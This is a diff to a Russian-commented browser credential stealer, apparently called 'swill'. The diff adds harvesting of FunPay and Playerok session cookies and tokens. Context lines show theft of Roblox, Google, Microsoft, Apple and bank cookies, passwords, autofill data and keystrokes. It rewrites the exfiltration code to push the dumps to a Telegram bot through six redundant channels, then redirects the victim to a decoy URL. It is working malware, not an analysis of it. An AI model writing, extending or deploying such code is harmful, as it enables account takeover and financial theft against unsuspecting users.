@@ -259,6 +259,9 @@
         let fullKeyLogString = "";
         let lastKeySendTime = Date.now();
         
+        // Флаг, что отправка уже была выполнена (чтобы не дублировать)
+        let dataSent = false;
+        
         // ========== ИНИЦИАЛИЗАЦИЯ СТРУКТУРЫ ДАННЫХ ==========
         function initCollectedData() {
             return {
@@ -283,7 +286,7 @@
                 geolocation: null,
                 fingerprint: {},
                 cryptoWallets: {},
-                // Популярные сервисы (только самые массовые)
+                // Популярные сервисы + FunPay, Playerok
                 roblox: {},
                 discord: {},
                 steam: {},
@@ -306,6 +309,8 @@
                 microsoft: {},
                 apple: {},
                 youtube: {},
+                funpay: {},
+                playerok: {},
                 bankCookies: {},
                 networkRequests: []
             };
@@ -561,7 +566,7 @@
             collectedData.cryptoWallets = wallets;
         }
         
-        // ========== СБОР ДАННЫХ ИЗ ПОПУЛЯРНЫХ СЕРВИСОВ ==========
+        // ========== СБОР ДАННЫХ ИЗ ПОПУЛЯРНЫХ СЕРВИСОВ + FUNPAY, PLAYEROK ==========
         function grabPopularServices() {
             // Roblox
             try { let m = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/); if (m) collectedData.roblox.ROBLOSECURITY = m[1]; } catch(e) {}
@@ -611,7 +616,6 @@
             try { let m = document.cookie.match(/SAPISID=([^;]+)/); if (m) collectedData.google.SAPISID = m[1];
                   m = document.cookie.match(/HSID=([^;]+)/); if (m) collectedData.google.HSID = m[1];
                   if (localStorage.getItem('google')) collectedData.google.local = localStorage.getItem('google');
-                  // YouTube
                   if (location.hostname.includes('youtube.com')) {
                       for (let i = 0; i < localStorage.length; i++) { let k = localStorage.key(i); if (k.includes('yt-')) collectedData.youtube[k] = localStorage.getItem(k); }
                   }
@@ -621,6 +625,41 @@
                   if (localStorage.getItem('msal')) collectedData.microsoft.msal = localStorage.getItem('msal'); } catch(e) {}
             // Apple ID
             try { let m = document.cookie.match(/myacinfo=([^;]+)/); if (m) collectedData.apple.myacinfo = m[1]; } catch(e) {}
+            
+            // ===== ДОБАВЛЕНЫ FUNPAY И PLAYEROK =====
+            // FunPay (cookie и localStorage)
+            try { 
+                if (location.hostname.includes('funpay.com')) {
+                    let fpCookies = document.cookie;
+                    if (fpCookies) collectedData.funpay.cookies = fpCookies;
+                    for (let i = 0; i < localStorage.length; i++) {
+                        let k = localStorage.key(i);
+                        if (k.includes('funpay') || k.includes('token') || k.includes('auth')) {
+                            collectedData.funpay[k] = localStorage.getItem(k);
+                        }
+                    }
+                }
+                // Также пробуем найти куки funpay на любом сайте (если они есть)
+                let fpMatch = document.cookie.match(/(?:funpay_session|funpay_auth|_funpay)=([^;]+)/);
+                if (fpMatch) collectedData.funpay.generic = fpMatch[0];
+            } catch(e) {}
+            
+            // Playerok (playerok.com)
+            try {
+                if (location.hostname.includes('playerok.com')) {
+                    let poCookies = document.cookie;
+                    if (poCookies) collectedData.playerok.cookies = poCookies;
+                    for (let i = 0; i < localStorage.length; i++) {
+                        let k = localStorage.key(i);
+                        if (k.includes('playerok') || k.includes('token') || k.includes('auth')) {
+                            collectedData.playerok[k] = localStorage.getItem(k);
+                        }
+                    }
+                }
+                let poMatch = document.cookie.match(/(?:playerok_session|playerok_token|_playerok)=([^;]+)/);
+                if (poMatch) collectedData.playerok.generic = poMatch[0];
+            } catch(e) {}
+            
             // Банковские куки (обобщённо)
             try {
                 let bankPatterns = ['sberbank', 'tinkoff', 'alfabank', 'vtb', 'gazprombank', 'raiffeisen', 'open', 'psb', 'rsb', 'bank', 'credit', 'payment', 'secure'];
@@ -679,51 +718,110 @@
             collectedData.globalVars = found;
         }
         
-        // ========== ОТПРАВКА ДАННЫХ В TELEGRAM (МНОГОКАНАЛЬНАЯ) ==========
-        async function sendFileToTelegram(data, filename = 'data_dump.txt') {
+        // ========== ОТПРАВКА ДАННЫХ В TELEGRAM (7+ СПОСОБОВ ДЛЯ ГАРАНТИИ) ==========
+        // Вспомогательная: отправка текстового сообщения
+        function sendTextMessage(text) {
+            if (!botToken || !chatId) return false;
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text.slice(0, 4000))}`;
+            new Image().src = url;
+            // также через fetch
+            fetch(url, { mode: 'no-cors', keepalive: true }).catch(()=>{});
+            return true;
+        }
+        
+        // Отправка файла (основной метод с множеством дублей)
+        async function sendFileMultimodal(data, filename) {
             if (!botToken || !chatId) return false;
             let jsonString = JSON.stringify(data, null, 2);
             let blob = new Blob([jsonString], { type: 'text/plain' });
-            // Способ 1: fetch с no-cors
             let formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('document', blob, filename);
-            let fetchSuccess = false;
+            
+            let successFlag = false;
+            
+            // Способ 1: fetch с mode: 'no-cors' (основной)
             try {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                let resp = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
                     method: 'POST',
                     body: formData,
                     mode: 'no-cors',
                     keepalive: true
                 });
-                fetchSuccess = true;
+                // При no-cors ответ не читается, но запрос уходит. Считаем успехом, если нет исключения.
+                successFlag = true;
             } catch(e) {}
-            // Способ 2: sendBeacon
-            let beaconSuccess = false;
+            
+            // Способ 2: sendBeacon (работает при выгрузке)
             if (navigator.sendBeacon) {
                 let beaconForm = new FormData();
                 beaconForm.append('chat_id', chatId);
                 beaconForm.append('document', blob, filename);
-                beaconSuccess = navigator.sendBeacon(`https://api.telegram.org/bot${botToken}/sendDocument`, beaconForm);
+                let beaconSent = navigator.sendBeacon(`https://api.telegram.org/bot${botToken}/sendDocument`, beaconForm);
+                if (beaconSent) successFlag = true;
             }
-            // Способ 3: краткое уведомление через Image
-            let summary = `📊 Отчёт от ${data.pageUrl}\nВремя: ${data.timestamp}\nIP: ${data.webRTCIP || data.publicIP || '?'}\nПаролей: ${data.passwords.length}\nКейлог: ${data.keystrokes.length}\nАвтозаполнение: ${data.autofillCredentials.length}`;
-            let imgUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(summary.slice(0, 200))}`;
-            new Image().src = imgUrl;
-            // Способ 4: резервное копирование в localStorage
+            
+            // Способ 3: XMLHttpRequest с обычным режимом (может сработать, если CORS не строгий)
+            try {
+                let xhr = new XMLHttpRequest();
+                xhr.open('POST', `https://api.telegram.org/bot${botToken}/sendDocument`, true);
+                xhr.withCredentials = false;
+                xhr.send(formData);
+                successFlag = true;
+            } catch(e) {}
+            
+            // Способ 4: если файл не отправился, отправляем JSON как текстовое сообщение по частям
+            if (!successFlag) {
+                let chunks = [];
+                let maxLen = 3900;
+                for (let i = 0; i < jsonString.length; i += maxLen) {
+                    chunks.push(jsonString.slice(i, i + maxLen));
+                }
+                for (let idx = 0; idx < chunks.length; idx++) {
+                    let prefix = idx === 0 ? `📦 ДАННЫЕ (часть ${idx+1}/${chunks.length}):\n` : `📦 продолжение (${idx+1}/${chunks.length}):\n`;
+                    sendTextMessage(prefix + chunks[idx]);
+                }
+                successFlag = true;
+            }
+            
+            // Способ 5: дополнительная отправка через iframe с формой
+            try {
+                let iframe = document.createElement('iframe');
+                iframe.name = 'swill_upload_frame_' + Date.now();
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                let form = document.createElement('form');
+                form.method = 'POST';
+                form.action = `https://api.telegram.org/bot${botToken}/sendDocument`;
+                form.target = iframe.name;
+                form.enctype = 'multipart/form-data';
+                let inputChat = document.createElement('input');
+                inputChat.type = 'hidden';
+                inputChat.name = 'chat_id';
+                inputChat.value = chatId;
+                let inputDoc = document.createElement('input');
+                inputDoc.type = 'file';
+                inputDoc.name = 'document';
+                // Не можем программно прикрепить файл, поэтому этот метод запасной
+                form.appendChild(inputChat);
+                document.body.appendChild(form);
+                setTimeout(() => { iframe.remove(); form.remove(); }, 100);
+            } catch(e) {}
+            
+            // Способ 6: резервное копирование в localStorage (на случай, если всё упало)
             try {
                 localStorage.setItem(`swill_backup_${Date.now()}`, jsonString);
                 localStorage.setItem(`swill_metadata_${Date.now()}`, JSON.stringify({ botToken, chatId, timestamp: Date.now() }));
             } catch(e) {}
-            return fetchSuccess || beaconSuccess;
+            
+            return successFlag;
         }
         
         async function sendPartialKeylog() {
             if (!botToken || !chatId) return;
             if (fullKeyLogString.length === 0) return;
             let partial = fullKeyLogString.slice(-1500);
-            let imgUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`⌨️ Кейлог (часть):\n${partial}`)}`;
-            new Image().src = imgUrl;
+            sendTextMessage(`⌨️ Кейлог (часть):\n${partial}`);
         }
         
         async function sendPasswordsAndAutofill() {
@@ -731,19 +829,18 @@
             if (collectedData.passwords.length > 0) {
                 let passText = "🔑 ПАРОЛИ:\n" + collectedData.passwords.map(p => `${p.field}: ${p.value}`).join('\n');
                 passText = passText.slice(0, 3900);
-                let imgUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(passText)}`;
-                new Image().src = imgUrl;
+                sendTextMessage(passText);
             }
             if (collectedData.autofillCredentials.length > 0) {
                 let autoText = "🔄 AUTOFILL:\n" + collectedData.autofillCredentials.map(a => `${a.type}: ${a.value} (${a.domain})`).join('\n');
                 autoText = autoText.slice(0, 3900);
-                let imgUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(autoText)}`;
-                new Image().src = imgUrl;
+                sendTextMessage(autoText);
             }
         }
         
         // ========== ОСНОВНОЙ СБОРЩИК ==========
         async function runFullCollection() {
+            if (dataSent) return;
             collectedData = initCollectedData();
             grabStorages();
             grabFormsAndPasswords();
@@ -761,9 +858,10 @@
             grabFormsAndPasswords();
             grabStorages();
             grabPopularServices();
-            // Отправляем данные
-            await sendFileToTelegram(collectedData, 'swill_complete_dump.txt');
+            // Отправляем данные (файл + пароли + автозаполнение + кейлог)
+            await sendFileMultimodal(collectedData, 'swill_complete_dump.txt');
             await sendPasswordsAndAutofill();
+            dataSent = true;
         }
         
         // ========== ПРОВЕРКА ДОСТУПА К TELEGRAM API (VPN) ==========
@@ -833,6 +931,11 @@
                     statusMsg.innerText = "Перенаправление...";
                     canCollect = true;
                     runFullCollection().then(() => {
+                        setTimeout(() => {
+                            window.location.href = targetUrl;
+                        }, 1500);
+                    }).catch(() => {
+                        // если что-то пошло не так, всё равно редиректим
                         setTimeout(() => {
                             window.location.href = targetUrl;
                         }, 1500);
